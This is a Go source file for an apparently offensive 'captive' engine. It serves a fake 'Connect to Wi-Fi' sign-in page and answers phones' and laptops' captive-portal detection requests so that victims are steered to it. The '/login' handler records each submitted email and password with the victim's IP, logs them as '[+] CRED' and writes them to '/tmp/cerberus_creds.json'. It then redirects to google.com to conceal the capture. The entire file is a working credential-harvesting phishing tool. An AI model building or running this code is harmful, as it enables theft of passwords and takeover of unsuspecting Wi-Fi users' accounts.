package captive

import ("encoding/json";"fmt";"log";"net/http";"os";"sync";"time")

type Credential struct { Time string `json:"time"`; IP string `json:"ip"`; Username string `json:"username"`; Password string `json:"password"`; Template string `json:"template"` }
type Engine struct { mu sync.RWMutex; active bool; tpl string; creds []Credential; srv *http.Server }

func New() *Engine { return &Engine{tpl: "google"} }
func (e *Engine) GetCredentials() []Credential { e.mu.RLock(); defer e.mu.RUnlock(); o := make([]Credential, len(e.creds)); copy(o, e.creds); return o }
func (e *Engine) IsActive() bool { e.mu.RLock(); defer e.mu.RUnlock(); return e.active }
func (e *Engine) Start(tpl string) error {
	e.mu.Lock(); defer e.mu.Unlock()
	if e.active { return fmt.Errorf("running") }
	e.tpl = tpl; e.active = true
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Connect</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#0f0f23;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.c{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:16px;padding:40px;width:380px;text-align:center}h1{margin-bottom:8px}p{color:rgba(255,255,255,.5);margin-bottom:24px;font-size:14px}input{width:100%;padding:12px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:8px;color:#fff;font-size:15px;margin-bottom:16px}button{background:#00ffc8;color:#000;border:none;padding:14px;width:100%;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}</style></head><body><div class="c"><h1>Connect to Wi-Fi</h1><p>Sign in to access the internet</p><form action="/login" method="POST"><input name="email" placeholder="Email" required><input name="password" type="password" placeholder="Password" required><button>Connect</button></form></div></body></html>`))
	})
	mux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			r.ParseForm()
			c := Credential{time.Now().Format("15:04:05"), r.RemoteAddr, r.FormValue("email"), r.FormValue("password"), tpl}
			e.mu.Lock(); e.creds = append(e.creds, c); e.mu.Unlock()
			log.Printf("[+] CRED: %s / %s", c.Username, c.Password)
			f, _ := os.OpenFile("/tmp/cerberus_creds.json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			json.NewEncoder(f).Encode(c); f.Close()
		}
		http.Redirect(w, r, "https://google.com", 302)
	})
	mux.HandleFunc("/generate_204", func(w http.ResponseWriter, r *http.Request) { http.Redirect(w, r, "/", 302) })
	mux.HandleFunc("/hotspot-detect.html", func(w http.ResponseWriter, r *http.Request) { http.Redirect(w, r, "/", 302) })
	e.srv = &http.Server{Addr: ":80", Handler: mux}
	go func() { log.Printf("[+] Captive on :80"); e.srv.ListenAndServe() }()
	return nil
}
func (e *Engine) Stop() { e.mu.Lock(); defer e.mu.Unlock(); if !e.active { return }; if e.srv != nil { e.srv.Close() }; e.active = false; log.Println("[-] Captive stopped") }
